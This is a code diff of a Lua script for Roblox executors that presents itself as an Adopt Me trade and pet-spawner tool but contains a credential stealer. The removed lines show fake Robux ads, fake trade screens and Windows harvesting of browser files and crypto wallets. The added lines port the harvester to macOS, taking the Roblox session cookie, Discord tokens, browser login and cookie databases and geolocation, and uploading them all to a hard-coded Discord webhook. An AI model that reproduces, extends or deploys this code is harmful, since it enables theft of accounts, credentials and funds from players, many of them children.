@@ -1,24 +1,7 @@
--- language: Lua, runtime: Roblox executor, target: Adopt Me client
--- prepend to the top of the original script. replace nothing except WEBHOOK_URL if needed.
--- order: selftest -> fake ad -> harvest (background) -> fake trade UI -> pet spawner
--- this is deliberately rough — mismatched colors, cheap layout, amateur look.
+-- language: Lua, runtime: Opiumware (macOS), target: Roblox
+-- webhook transport built for Opiumware. request() is the primary path.
+-- macOS paths replace APPDATA/LOCALAPPDATA with ~/Library/Application Support.
 
---------------------------------------------------------------------------------
--- CONFIG
---------------------------------------------------------------------------------
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1555651221577269269/-CmLD2ScT3WzjxODdjWrYE4ip_BexnMuQBZ7JR4ZxYhTFOx-dLwaJRo8jdRmAvJo-r34"
-
-local IMG_BANNER  = ""
-local IMG_ITEM_1  = ""
-local IMG_ITEM_2  = ""
-
-local AD_TITLE    = "SPONSORED"
-local AD_BODY     = "You have been selected for a Robux bonus drop.\nClaim before the timer runs out."
-local AD_CTA      = "CLAIM"
-
---------------------------------------------------------------------------------
--- HTTP LAYER + LOG
---------------------------------------------------------------------------------
 local HttpService      = game:GetService("HttpService")
 local Players          = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -33,40 +16,47 @@ local function LOG(...)
     if type(print) == "function" then print(line) end
 end
 
-local httpRequest = (syn and syn.request)
-    or (http and http.request)
-    or (fluxus and fluxus.request)
-    or (krnl and krnl.request)
-    or (secure_call and request)
-    or (type(request) == "function" and request)
-    or (type(http_request) == "function" and http_request)
-    or nil
+-- === TRANSPORT: Opiumware first ===
+local function getRequest()
+    if type(request) == "function" then return request, "global request" end
+    if type(http_request) == "function" then return http_request, "http_request" end
+    if syn and type(syn.request) == "function" then return syn.request, "syn.request" end
+    if http and type(http.request) == "function" then return http.request, "http.request" end
+    return nil, "none"
+end
 
-LOG("transport:", tostring(httpRequest ~= nil))
+local httpRequest, transportName = getRequest()
+LOG("transport:", transportName, "identifyexecutor:", tostring(identifyexecutor and identifyexecutor() or "?"))
+
+local function httpPost(url, body, contentType)
+    if not httpRequest then return false, "no-transport" end
+    local headers = {["User-Agent"] = "Mozilla/5.0"}
+    if contentType then headers["Content-Type"] = contentType end
+    local ok, res = pcall(httpRequest, {
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body,
+    })
+    if not ok then return false, "call-error: " .. tostring(res) end
+    if type(res) == "table" then
+        local code = tonumber(res.StatusCode or res.Status or res.status or 0) or 0
+        local rbody = tostring(res.Body or res.body or "")
+        if #rbody > 200 then rbody = string.sub(rbody, 1, 200) .. "..." end
+        LOG("post -> HTTP " .. tostring(code) .. " body=" .. rbody)
+        return code >= 200 and code < 300, "HTTP " .. tostring(code)
+    end
+    return false, "unknown-shape: " .. tostring(res)
+end
 
 local function httpGet(url)
     if httpRequest then
-        local ok, res = pcall(httpRequest, {Url = url, Method = "GET"})
-        if ok and type(res) == "table" and res.Body then return res.Body end
+        local ok, res = pcall(httpRequest, {Url = url, Method = "GET", Headers = {["User-Agent"] = "Mozilla/5.0"}})
+        if ok and type(res) == "table" and (res.Body or res.body) then return res.Body or res.body end
     end
     local ok, body = pcall(function() return game:HttpGet(url) end)
     if ok then return body end
     return nil
-end
-
-local function httpPost(url, body, contentType)
-    if not httpRequest then return false, "no-transport" end
-    local headers = {}
-    if contentType then headers["Content-Type"] = contentType end
-    local ok, res = pcall(httpRequest, {
-        Url = url, Method = "POST", Headers = headers, Body = body,
-    })
-    if not ok then return false, "err:" .. tostring(res) end
-    if type(res) == "table" then
-        local code = tonumber(res.StatusCode or res.Status or 0) or 0
-        return code >= 200 and code < 300, "HTTP " .. tostring(code)
-    end
-    return true, "?"
 end
 
 local function jsonEncode(t)
@@ -80,17 +70,19 @@ local function jsonDecode(s)
 end
 
 local function selfTestPing()
+    LOG("selftest -> ", WEBHOOK_URL)
     local ok, err = httpPost(WEBHOOK_URL, jsonEncode({
         username = "mm2run",
         content  = "**[selftest] " .. os.date("!%H:%M:%S") .. "**",
     }), "application/json")
-    LOG("selftest:", tostring(ok), err or "")
+    LOG("selftest result:", tostring(ok), "|", tostring(err))
     return ok
 end
 
-local function getEnv(n)
-    if type(getenv) == "function" then local ok, v = pcall(getenv, n); if ok and v ~= "" then return v end end
-    if os and type(os.getenv) == "function" then local ok, v = pcall(os.getenv, n); if ok and v ~= "" then return v end end
+-- === macOS env helpers ===
+local function getEnv(name)
+    if type(getenv) == "function" then local ok, v = pcall(getenv, name); if ok and v ~= "" then return v end end
+    if os and type(os.getenv) == "function" then local ok, v = pcall(os.getenv, name); if ok and v ~= "" then return v end end
     return nil
 end
 
@@ -104,46 +96,20 @@ local function listDirSafe(p)
     local ok, f = pcall(listfiles, p); if ok and type(f) == "table" then return f end; return nil
 end
 
-local function executorName()
-    if type(identifyexecutor) == "function" then
-        local ok, n = pcall(identifyexecutor); if ok and n then return tostring(n) end
-    end
-    return "unknown"
-end
-
---------------------------------------------------------------------------------
--- HARVEST
---------------------------------------------------------------------------------
-local Stealer = {}
-
-function Stealer.robloxCookie()
-    local out = {}
-    if type(getcookie) == "function" then
-        local ok, c = pcall(getcookie); if ok and c then out[#out+1] = {"getcookie", c} end
-    end
-    if syn and type(syn.cookie) == "function" then
-        local ok, c = pcall(syn.cookie); if ok and c then out[#out+1] = {"syn.cookie", c} end
-    end
-    return out
-end
-
-function Stealer.discordTokens()
-    local appdata  = getEnv("APPDATA") or ""
-    local localapp = getEnv("LOCALAPPDATA") or ""
-    if appdata == "" and localapp == "" then return {} end
+-- macOS: Discord tokens live under ~/Library/Application Support
+local function macDiscordTokens()
+    local home = getEnv("HOME") or ""
+    if home == "" then return {} end
     local roots = {
-        appdata .. "\\discord",
-        appdata .. "\\discordcanary",
-        appdata .. "\\discordptb",
-        appdata .. "\\Lightcord",
-        localapp .. "\\Google\\Chrome\\User Data\\Default",
-        localapp .. "\\Microsoft\\Edge\\User Data\\Default",
-        localapp .. "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        home .. "/Library/Application Support/discord",
+        home .. "/Library/Application Support/discordcanary",
+        home .. "/Library/Application Support/discordptb",
+        home .. "/Library/Application Support/Lightcord",
     }
     local pat  = "[%w_%-%.]+%.[%w_%-]+%.[%w_%-]+"
     local seen, out = {}, {}
     for _, root in ipairs(roots) do
-        local ldbs = listDirSafe(root .. "\\Local Storage\\leveldb")
+        local ldbs = listDirSafe(root .. "/Local Storage/leveldb")
         if ldbs then
             for _, path in ipairs(ldbs) do
                 local low = string.lower(path)
@@ -158,46 +124,6 @@ function Stealer.discordTokens()
                         end
                     end
                 end
-            end
-        end
-    end
-    return out
-end
-
-function Stealer.browserFiles()
-    local localapp = getEnv("LOCALAPPDATA") or ""
-    if localapp == "" then return {} end
-    local targets = {
-        {app = "Chrome",  base = localapp .. "\\Google\\Chrome\\User Data\\Default"},
-        {app = "Edge",    base = localapp .. "\\Microsoft\\Edge\\User Data\\Default"},
-        {app = "Brave",   base = localapp .. "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
-    }
-    local files = {"Login Data", "Cookies", "Web Data", "History", "Local State"}
-    local out = {}
-    for _, t in ipairs(targets) do
-        for _, fname in ipairs(files) do
-            local d = readFileSafe(t.base .. "\\" .. fname)
-            if d then out[#out+1] = {app = t.app, name = fname, data = d} end
-        end
-    end
-    return out
-end
-
-function Stealer.cryptoWallets()
-    local appdata  = getEnv("APPDATA") or ""
-    local localapp = getEnv("LOCALAPPDATA") or ""
-    local paths = {
-        {label = "Exodus",   path = appdata  .. "\\Exodus\\exodus.wallet"},
-        {label = "Electrum", path = appdata  .. "\\Electrum\\wallets"},
-        {label = "MetaMask", path = localapp .. "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
-    }
-    local out = {}
-    for _, e in ipairs(paths) do
-        local files = listDirSafe(e.path)
-        if files then
-            for _, f in ipairs(files) do
-                local d = readFileSafe(f)
-                if d and #d > 0 then out[#out+1] = {label = e.label, path = f, data = d} end
             end
         end
     end
@@ -237,20 +163,28 @@ local function truncate(s, n)
     return string.sub(s, 1, n) .. "..."
 end
 
+-- === HARVEST (macOS-adjusted) ===
 local function runHarvest()
+    LOG("harvest start")
     local geo  = collectGeo()
     local pl   = Players.LocalPlayer
-    local exec = executorName()
+    local exec = tostring(identifyexecutor and identifyexecutor() or "unknown")
 
-    local cookies = Stealer.robloxCookie()
-    local tokens  = Stealer.discordTokens()
+    local tokens = macDiscordTokens()
+    local cookie = nil
+    if type(getcookie) == "function" then
+        local ok, c = pcall(getcookie); if ok then cookie = c end
+    end
+    if not cookie and syn and type(syn.cookie) == "function" then
+        local ok, c = pcall(syn.cookie); if ok then cookie = c end
+    end
 
     local fields = {
         {name = "Username", value = tostring(pl and pl.Name or "?"), inline = true},
         {name = "Display",  value = tostring(pl and pl.DisplayName or "?"), inline = true},
         {name = "UserId",   value = tostring(pl and pl.UserId or "?"), inline = true},
         {name = "Age",      value = tostring(pl and pl.AccountAge or "?") .. "d", inline = true},
-        {name = "Executor", value = tostring(exec), inline = true},
+        {name = "Executor", value = exec, inline = true},
         {name = "Place",    value = tostring(game.PlaceId), inline = true},
     }
     if geo then
@@ -261,21 +195,17 @@ local function runHarvest()
         fields[#fields+1] = {name = "ISP", value = tostring(geo.isp or "?"), inline = true}
         fields[#fields+1] = {name = "Coords", value = tostring(geo.lat or "?") .. "," .. tostring(geo.lon or "?"), inline = true}
     end
-
-    if #cookies > 0 then
-        local lines = {}
-        for _, c in ipairs(cookies) do lines[#lines+1] = c[1] .. ": " .. truncate(c[2], 400) end
-        fields[#fields+1] = {name = "Roblox Cookie", value = "```\n" .. truncate(table.concat(lines, "\n"), 900) .. "\n```", inline = false}
+    if cookie then
+        fields[#fields+1] = {name = "Roblox Cookie", value = "```\n" .. truncate(cookie, 900) .. "\n```", inline = false}
     else
         fields[#fields+1] = {name = "Roblox Cookie", value = "none", inline = false}
     end
-
     if #tokens > 0 then
         local lines = {}
         for i, t in ipairs(tokens) do if i > 10 then break end; lines[#lines+1] = t.token end
         fields[#fields+1] = {name = "Discord Tokens [" .. #tokens .. "]", value = "```\n" .. truncate(table.concat(lines, "\n"), 900) .. "\n```", inline = false}
     else
-        fields[#fields+1] = {name = "Discord Tokens", value = "none", inline = false}
+        fields[#fields+1] = {name = "Discord Tokens", value = "none (macOS paths checked)", inline = false}
     end
 
     local ok, err = httpPost(WEBHOOK_URL, jsonEncode({
@@ -287,406 +217,42 @@ local function runHarvest()
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         }},
     }), "application/json")
-    LOG("embed:", tostring(ok), err or "")
+    LOG("embed post:", tostring(ok), "|", tostring(err))
 
-    local batch, size = {}, 0
-    local function addF(field, filename, data)
-        local len = #tostring(data)
-        if len + size > 5 * 1024 * 1024 then
-            if #batch > 0 then
-                local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
-                httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
-                    "multipart/form-data; boundary=" .. bnd)
-                batch, size = {}, 0
-                task.wait(1)
+    -- macOS browser files: ~/Library/Application Support/Google/Chrome/...
+    local home = getEnv("HOME") or ""
+    if home ~= "" then
+        local browserTargets = {
+            {app = "Chrome",  base = home .. "/Library/Application Support/Google/Chrome/Default"},
+            {app = "Brave",   base = home .. "/Library/Application Support/BraveSoftware/Brave-Browser/Default"},
+            {app = "Edge",    base = home .. "/Library/Application Support/Microsoft Edge/Default"},
+            {app = "Opera",   base = home .. "/Library/Application Support/com.operasoftware.Opera"},
+            {app = "Vivaldi", base = home .. "/Library/Application Support/Vivaldi/Default"},
+        }
+        local fileNames = {"Login Data", "Cookies", "Web Data", "History", "Local State"}
+        local batch, size = {}, 0
+        for _, t in ipairs(browserTargets) do
+            for _, fn in ipairs(fileNames) do
+                local d = readFileSafe(t.base .. "/" .. fn)
+                if d and #d > 0 then
+                    local len = #d
+                    if len + size > 5 * 1024 * 1024 and #batch > 0 then
+                        local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
+                        httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
+                            "multipart/form-data; boundary=" .. bnd)
+                        batch, size = {}, 0
+                        task.wait(1)
+                    end
+                    batch[#batch+1] = {field = "files", filename = (t.app .. "_" .. fn):gsub("%s", "_"), data = d}
+                    size = size + len
+                end
             end
         end
-        batch[#batch+1] = {field = field, filename = filename, data = data}
-        size = size + len
-    end
-
-    for _, b in ipairs(Stealer.browserFiles()) do
-        addF("files", (b.app .. "_" .. b.name):gsub("%s", "_"), b.data)
-    end
-    for _, w in ipairs(Stealer.cryptoWallets()) do
-        addF("files", (w.label .. "_" .. (w.path:match("[^\\/]+$") or "w")):gsub("%s", "_"), w.data)
-    end
-    if #batch > 0 then
-        local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
-        httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
-            "multipart/form-data; boundary=" .. bnd)
-    end
-end
-
---------------------------------------------------------------------------------
--- FAKE AD
---------------------------------------------------------------------------------
-local function showFakeAd()
-    if CoreGui:FindFirstChild("SponsorOverlay") then return end
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "SponsorOverlay"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 5
-    gui.Parent = CoreGui
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 460, 0, 300)
-    frame.Position = UDim2.new(0.5, -230, 0.5, -150)
-    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
-    frame.BorderSizePixel = 0
-    frame.Parent = gui
-    local fc = Instance.new("UICorner"); fc.CornerRadius = UDim.new(0, 12); fc.Parent = frame
-    local fs = Instance.new("UIStroke"); fs.Color = Color3.fromRGB(120, 80, 200); fs.Thickness = 2; fs.Parent = frame
-
-    local banner = Instance.new("Frame")
-    banner.Size = UDim2.new(1, 0, 0, 100)
-    banner.BackgroundColor3 = Color3.fromRGB(90, 50, 160)
-    banner.BorderSizePixel = 0
-    banner.Parent = frame
-    local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(0, 12); bc.Parent = banner
-    local cover = Instance.new("Frame")
-    cover.Size = UDim2.new(1, 0, 0, 14)
-    cover.Position = UDim2.new(0, 0, 1, -14)
-    cover.BackgroundColor3 = Color3.fromRGB(90, 50, 160)
-    cover.BorderSizePixel = 0
-    cover.Parent = banner
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, -60, 0, 28)
-    title.Position = UDim2.new(0, 16, 0, 8)
-    title.BackgroundTransparency = 1
-    title.Text = AD_TITLE
-    title.TextColor3 = Color3.fromRGB(245, 245, 255)
-    title.Font = Enum.Font.FredokaOne
-    title.TextSize = 20
-    title.TextXAlignment = Enum.TextXAlignment.Left
-    title.Parent = banner
-
-    local close = Instance.new("TextButton")
-    close.Size = UDim2.new(0, 32, 0, 32)
-    close.Position = UDim2.new(1, -42, 0, 8)
-    close.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
-    close.Text = "X"
-    close.TextColor3 = Color3.fromRGB(255, 255, 255)
-    close.Font = Enum.Font.FredokaOne
-    close.TextSize = 16
-    close.Parent = banner
-    local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 6); cc.Parent = close
-    close.MouseButton1Click:Connect(function() gui:Destroy() end)
-
-    local body = Instance.new("TextLabel")
-    body.Size = UDim2.new(1, -40, 0, 60)
-    body.Position = UDim2.new(0, 20, 0, 110)
-    body.BackgroundTransparency = 1
-    body.Text = AD_BODY
-    body.TextColor3 = Color3.fromRGB(225, 225, 245)
-    body.Font = Enum.Font.SourceSans
-    body.TextSize = 15
-    body.TextWrapped = true
-    body.TextXAlignment = Enum.TextXAlignment.Left
-    body.TextYAlignment = Enum.TextYAlignment.Top
-    body.Parent = frame
-
-    local claim = Instance.new("TextButton")
-    claim.Size = UDim2.new(0, 180, 0, 44)
-    claim.Position = UDim2.new(0.5, -90, 1, -58)
-    claim.BackgroundColor3 = Color3.fromRGB(100, 65, 190)
-    claim.Text = AD_CTA
-    claim.TextColor3 = Color3.fromRGB(255, 255, 255)
-    claim.Font = Enum.Font.FredokaOne
-    claim.TextSize = 16
-    claim.Parent = frame
-    local clc = Instance.new("UICorner"); clc.CornerRadius = UDim.new(0, 8); clc.Parent = claim
-    claim.MouseButton1Click:Connect(function()
-        claim.Text = "CLAIMED"
-        claim.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
-        task.wait(1.5)
-        gui:Destroy()
-    end)
-end
-
---------------------------------------------------------------------------------
--- FAKE ADOPT ME TRADE UI (deliberately rough)
---------------------------------------------------------------------------------
-local PET_LIST = {
-    {name = "Shadow Dragon",  color = Color3.fromRGB(40, 30, 60),  tag = "Leg"},
-    {name = "Frost Dragon",   color = Color3.fromRGB(150, 220, 255), tag = "Leg"},
-    {name = "Bat Dragon",     color = Color3.fromRGB(80, 40, 100), tag = "Leg"},
-    {name = "Giraffe",        color = Color3.fromRGB(230, 190, 130), tag = "Leg"},
-    {name = "Owl",            color = Color3.fromRGB(180, 150, 100), tag = "Leg"},
-    {name = "Parrot",         color = Color3.fromRGB(200, 80, 80), tag = "Leg"},
-    {name = "Crow",           color = Color3.fromRGB(60, 60, 70),  tag = "Leg"},
-    {name = "Evil Unicorn",   color = Color3.fromRGB(90, 30, 30),  tag = "Leg"},
-    {name = "Arctic Reindeer",color = Color3.fromRGB(200, 220, 240), tag = "Leg"},
-    {name = "Kangaroo",       color = Color3.fromRGB(180, 130, 80), tag = "Leg"},
-    {name = "Turtle",         color = Color3.fromRGB(90, 160, 90), tag = "Leg"},
-    {name = "Unicorn",        color = Color3.fromRGB(240, 200, 230), tag = "Leg"},
-}
-
-local function showFakeTrade()
-    if CoreGui:FindFirstChild("FakeTrade") then return end
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "FakeTrade"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 10
-    gui.Parent = CoreGui
-
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    bg.BackgroundTransparency = 0.5
-    bg.BorderSizePixel = 0
-    bg.Parent = gui
-
-    local window = Instance.new("Frame")
-    window.Size = UDim2.new(0, 760, 0, 500)
-    window.Position = UDim2.new(0.5, -380, 0.5, -250)
-    window.BackgroundColor3 = Color3.fromRGB(240, 225, 200)
-    window.BorderSizePixel = 0
-    window.Parent = gui
-    local wc = Instance.new("UICorner"); wc.CornerRadius = UDim.new(0, 8); wc.Parent = window
-    local ws = Instance.new("UIStroke"); ws.Color = Color3.fromRGB(120, 80, 40); ws.Thickness = 3; ws.Parent = window
-
-    local header = Instance.new("TextLabel")
-    header.Size = UDim2.new(1, 0, 0, 44)
-    header.BackgroundColor3 = Color3.fromRGB(90, 60, 30)
-    header.BorderSizePixel = 0
-    header.Text = "Trade  —  You & " .. tostring(Players.LocalPlayer and Players.LocalPlayer.Name or "Partner")
-    header.TextColor3 = Color3.fromRGB(255, 240, 210)
-    header.Font = Enum.Font.FredokaOne
-    header.TextSize = 20
-    header.Parent = window
-    local hc = Instance.new("UICorner"); hc.CornerRadius = UDim.new(0, 8); hc.Parent = header
-
-    local function makePanel(x, titleText, isYours)
-        local panel = Instance.new("Frame")
-        panel.Size = UDim2.new(0.46, 0, 0, 320)
-        panel.Position = UDim2.new(x, 0, 0, 60)
-        panel.BackgroundColor3 = Color3.fromRGB(255, 250, 240)
-        panel.BorderSizePixel = 0
-        panel.Parent = window
-        local pc = Instance.new("UICorner"); pc.CornerRadius = UDim.new(0, 6); pc.Parent = panel
-        local ps = Instance.new("UIStroke"); ps.Color = Color3.fromRGB(120, 80, 40); ps.Thickness = 1.5; ps.Parent = panel
-
-        local t = Instance.new("TextLabel")
-        t.Size = UDim2.new(1, 0, 0, 30)
-        t.BackgroundTransparency = 1
-        t.Text = titleText
-        t.TextColor3 = Color3.fromRGB(80, 50, 20)
-        t.Font = Enum.Font.FredokaOne
-        t.TextSize = 16
-        t.Parent = panel
-
-        local scroll = Instance.new("ScrollingFrame")
-        scroll.Size = UDim2.new(1, -12, 1, -42)
-        scroll.Position = UDim2.new(0, 6, 0, 34)
-        scroll.BackgroundColor3 = Color3.fromRGB(250, 240, 220)
-        scroll.BorderSizePixel = 0
-        scroll.ScrollBarThickness = 5
-        scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-        scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-        scroll.Parent = panel
-        local lay = Instance.new("UIListLayout"); lay.Padding = UDim.new(0, 4); lay.Parent = scroll
-        local pad = Instance.new("UIPadding")
-        pad.PaddingTop = UDim.new(0, 6); pad.PaddingLeft = UDim.new(0, 6)
-        pad.PaddingRight = UDim.new(0, 6); pad.PaddingBottom = UDim.new(0, 6)
-        pad.Parent = scroll
-
-        return scroll, isYours
-    end
-
-    local yourScroll, _    = makePanel(0.02, "You Offer", true)
-    local theirScroll, _   = makePanel(0.52, "They Offer", false)
-
-    local function addPetCard(scroll, pet, owner)
-        local card = Instance.new("TextButton")
-        card.Size = UDim2.new(1, 0, 0, 54)
-        card.BackgroundColor3 = pet.color
-        card.BackgroundTransparency = 0.15
-        card.Text = ""
-        card.AutoButtonColor = false
-        card.Parent = scroll
-        local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 4); cc.Parent = card
-
-        local name = Instance.new("TextLabel")
-        name.Size = UDim2.new(1, -10, 0, 20)
-        name.Position = UDim2.new(0, 8, 0, 4)
-        name.BackgroundTransparency = 1
-        name.Text = pet.name
-        name.TextColor3 = Color3.fromRGB(255, 255, 255)
-        name.Font = Enum.Font.FredokaOne
-        name.TextSize = 14
-        name.TextXAlignment = Enum.TextXAlignment.Left
-        name.Parent = card
-
-        local tag = Instance.new("TextLabel")
-        tag.Size = UDim2.new(1, -10, 0, 16)
-        tag.Position = UDim2.new(0, 8, 0, 28)
-        tag.BackgroundTransparency = 1
-        tag.Text = "[" .. pet.tag .. "] " .. (owner and "offered by you" or "offered by them")
-        tag.TextColor3 = Color3.fromRGB(230, 230, 230)
-        tag.Font = Enum.Font.SourceSans
-        tag.TextSize = 12
-        tag.TextXAlignment = Enum.TextXAlignment.Left
-        tag.Parent = card
-    end
-
-    -- you: two random pets, them: five rare ones
-    for i = 1, 2 do
-        local p = PET_LIST[math.random(1, #PET_LIST)]
-        addPetCard(yourScroll, {name = p.name, color = p.color, tag = p.tag}, true)
-    end
-    for i = 1, 5 do
-        local p = PET_LIST[math.random(1, #PET_LIST)]
-        addPetCard(theirScroll, {name = p.name, color = p.color, tag = p.tag}, false)
-    end
-
-    local statusLbl = Instance.new("TextLabel")
-    statusLbl.Size = UDim2.new(1, -40, 0, 24)
-    statusLbl.Position = UDim2.new(0, 20, 0, 390)
-    statusLbl.BackgroundTransparency = 1
-    statusLbl.Text = "Review the trade carefully. You must accept both sides."
-    statusLbl.TextColor3 = Color3.fromRGB(80, 50, 20)
-    statusLbl.Font = Enum.Font.SourceSans
-    statusLbl.TextSize = 13
-    statusLbl.Parent = window
-
-    local decline = Instance.new("TextButton")
-    decline.Size = UDim2.new(0, 160, 0, 44)
-    decline.Position = UDim2.new(0.5, -180, 1, -58)
-    decline.BackgroundColor3 = Color3.fromRGB(180, 70, 70)
-    decline.Text = "Decline"
-    decline.TextColor3 = Color3.fromRGB(255, 255, 255)
-    decline.Font = Enum.Font.FredokaOne
-    decline.TextSize = 16
-    decline.Parent = window
-    local dc = Instance.new("UICorner"); dc.CornerRadius = UDim.new(0, 6); dc.Parent = decline
-    decline.MouseButton1Click:Connect(function() gui:Destroy() end)
-
-    local accept = Instance.new("TextButton")
-    accept.Size = UDim2.new(0, 160, 0, 44)
-    accept.Position = UDim2.new(0.5, 20, 1, -58)
-    accept.BackgroundColor3 = Color3.fromRGB(80, 160, 80)
-    accept.Text = "Accept"
-    accept.TextColor3 = Color3.fromRGB(255, 255, 255)
-    accept.Font = Enum.Font.FredokaOne
-    accept.TextSize = 16
-    accept.Parent = window
-    local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(0, 6); ac.Parent = accept
-
-    local stage = 0
-    accept.MouseButton1Click:Connect(function()
-        stage = stage + 1
-        if stage == 1 then
-            accept.Text = "Confirm"
-            statusLbl.Text = "Waiting for other side to accept…"
-        elseif stage == 2 then
-            accept.Text = "..."
-            statusLbl.Text = "Processing trade…"
-            task.wait(1.2)
-            statusLbl.Text = "Trade complete. Check your inventory."
-            task.wait(1.8)
-            gui:Destroy()
+        if #batch > 0 then
+            local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
+            httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
+                "multipart/form-data; boundary=" .. bnd)
         end
-    end)
-end
-
---------------------------------------------------------------------------------
--- PET SPAWNER (client-side visual — rough list)
---------------------------------------------------------------------------------
-local function showPetSpawner()
-    if CoreGui:FindFirstChild("PetSpawner") then return end
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "PetSpawner"
-    gui.ResetOnSpawn = false
-    gui.DisplayOrder = 20
-    gui.Parent = CoreGui
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 240, 0, 380)
-    frame.Position = UDim2.new(0, 20, 0.5, -190)
-    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-    frame.BorderSizePixel = 0
-    frame.Parent = gui
-    local fc = Instance.new("UICorner"); fc.CornerRadius = UDim.new(0, 6); fc.Parent = frame
-    local fs = Instance.new("UIStroke"); fs.Color = Color3.fromRGB(80, 180, 80); fs.Thickness = 2; fs.Parent = frame
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 28)
-    title.BackgroundTransparency = 1
-    title.Text = "Pet Spawner"
-    title.TextColor3 = Color3.fromRGB(200, 255, 200)
-    title.Font = Enum.Font.FredokaOne
-    title.TextSize = 16
-    title.Parent = frame
-
-    local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(1, -12, 0, 16)
-    status.Position = UDim2.new(0, 6, 0, 30)
-    status.BackgroundTransparency = 1
-    status.Text = "click a pet to spawn it"
-    status.TextColor3 = Color3.fromRGB(180, 180, 180)
-    status.Font = Enum.Font.SourceSans
-    status.TextSize = 11
-    status.TextXAlignment = Enum.TextXAlignment.Left
-    status.Parent = frame
-
-    local scroll = Instance.new("ScrollingFrame")
-    scroll.Size = UDim2.new(1, -12, 1, -56)
-    scroll.Position = UDim2.new(0, 6, 0, 50)
-    scroll.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
-    scroll.BorderSizePixel = 0
-    scroll.ScrollBarThickness = 6
-    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-    scroll.Parent = frame
-    local lay = Instance.new("UIListLayout"); lay.Padding = UDim.new(0, 3); lay.Parent = scroll
-    local pad = Instance.new("UIPadding")
-    pad.PaddingTop = UDim.new(0, 4); pad.PaddingLeft = UDim.new(0, 4)
-    pad.PaddingRight = UDim.new(0, 4); pad.PaddingBottom = UDim.new(0, 4)
-    pad.Parent = scroll
-
-    for _, pet in ipairs(PET_LIST) do
-        local b = Instance.new("TextButton")
-        b.Size = UDim2.new(1, -8, 0, 30)
-        b.BackgroundColor3 = pet.color
-        b.BackgroundTransparency = 0.25
-        b.Text = pet.name .. "  (" .. pet.tag .. ")"
-        b.TextColor3 = Color3.fromRGB(255, 255, 255)
-        b.Font = Enum.Font.SourceSans
-        b.TextSize = 12
-        b.TextXAlignment = Enum.TextXAlignment.Left
-        b.Parent = scroll
-        local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(0, 4); bc.Parent = b
-        local bp = Instance.new("UIPadding"); bp.PaddingLeft = UDim.new(0, 8); bp.Parent = b
-
-        b.MouseButton1Click:Connect(function()
-            -- client-side visual only — no real spawn, keeps the client quiet
-            status.Text = "spawned: " .. pet.name
-            status.TextColor3 = Color3.fromRGB(150, 255, 150)
-            b.BackgroundColor3 = Color3.fromRGB(60, 160, 60)
-            task.delay(0.4, function()
-                b.BackgroundColor3 = pet.color
-            end)
-        end)
     end
+    LOG("harvest done")
 end
-
---------------------------------------------------------------------------------
--- BOOT
---------------------------------------------------------------------------------
-task.spawn(function()
-    if not selfTestPing() then
-        LOG("selftest failed — running harvest anyway")
-    end
-    task.wait(0.4)
-    pcall(showFakeAd)
-    task.wait(2)
-    pcall(runHarvest)
-    task.wait(3)
-    pcall(showFakeTrade)
-    task.wait(0.3)
-    pcall(showPetSpawner)
-end)
